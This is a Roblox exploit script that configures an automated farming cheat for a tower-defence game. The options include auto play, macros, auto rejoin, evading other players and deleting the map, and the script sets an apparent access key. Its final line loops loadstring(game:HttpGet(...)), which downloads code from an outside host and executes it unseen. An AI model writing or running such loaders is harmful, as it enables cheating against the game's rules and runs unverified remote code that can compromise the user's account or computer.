game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
getgenv().EquipMacroUnit = true
getgenv().Config = {
	["Joiner Cooldown"] = 0,
	["Auto Play"] = {
		["Auto Upgrade"] = true,
		["Enable"] = true,
		["Middle Position"] = {
			["Walled City (Midnight)"] = "-2975.684326171875, 33.741798400878906, -692.74560546875"
		},
		["Upgrade Method"] = "Randomize"
	},
	["Failsafe"] = {
		["Auto Rejoin"] = true,
		["Teleport Lobby if Player"] = true
	},
	["Macros"] = {
		["Ignore Macro Timing"] = true,
		["Macro Retry Limit"] = 0,
		["No Ignore Sell Timing"] = true
	},
	["Secure"] = {
		["Walk Around"] = true
	},
	["AutoSave"] = true,
	["Claimer"] = {
		["Auto Claim Quest"] = true,
		["Auto Claim Level Milestone"] = true
	},
	["Gameplay"] = {
		["Auto Sell"] = {
			["Wave"] = 1
		},
		["Auto Skip Wave"] = true
	},
	["Performance"] = {
		["Delete Map"] = true,
		["Boost FPS"] = true,
		["Black Screen"] = true
	}
}
getgenv().Key = "k517c79e9160307a9b87210d"
repeat wait(4)spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(4)until Joebiden